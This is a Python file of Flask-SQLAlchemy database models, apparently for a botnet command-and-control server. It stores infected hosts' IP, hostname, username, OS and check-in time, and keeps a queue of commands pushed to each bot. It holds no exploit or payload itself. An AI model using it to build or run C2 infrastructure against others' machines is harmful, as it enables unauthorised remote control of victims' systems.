from flask_appbuilder import Model
from datetime import datetime
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()
#Model for a Bot has id, ip, hostname,username, os, last_ping, constructors, and a func to push a command to its table of commands
class Bot(db.Model):
	__tablename__ = 'bots'
	id = db.Column(db.Integer, primary_key = True)
	ip = db.Column(db.String(150), unique = True, nullable = False)
	hostname = db.Column(db.String(150))
	username = db.Column(db.String(150))
	os = db.Column(db.String(150))
	last_ping = db.Column(db.DateTime())
	output = db.Column(db.Text(), default="")
	def __init__(self, uid):
		self.id = uid

	def push_command(self, cmd):
		com = Command(self, cmd)
		db.session.add(com)
		db.session.commit()

#Model for command each has an id a bot that it is related to, cmd and time and constructor
#Each bot has a table of commands thus the backref
class Command(db.Model):
	__tablename__ = 'commands'
	id = db.Column(db.Integer, primary_key=True)
	bot_id = db.Column(db.Integer(), db.ForeignKey('bots.id'))
	bot = db.relationship('Bot', backref=db.backref('commands', lazy='dynamic'))
	cmd = db.Column(db.String(255))
	timestamp = db.Column(db.DateTime(), default=datetime.now)

	def __init__(self, bot, cmd):
		self.bot = bot
		self.cmd = cmd
		self.timestamp = datetime.now()
